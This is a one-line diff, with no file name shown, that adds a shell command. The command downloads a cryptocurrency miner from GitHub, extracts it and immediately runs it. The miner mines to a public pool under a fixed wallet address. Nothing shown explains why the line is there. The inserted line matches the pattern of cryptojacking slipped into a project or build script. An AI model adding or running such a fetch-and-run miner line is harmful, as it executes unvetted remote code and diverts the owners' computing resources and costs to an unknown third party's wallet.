@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a minotaurx -o stratum+tcps://minotaurx.na.mine.zpool.ca:57019 -u RRzL8NpRvYccXCaBXbm4BVyVSja3tGmMqs -p c=RVN
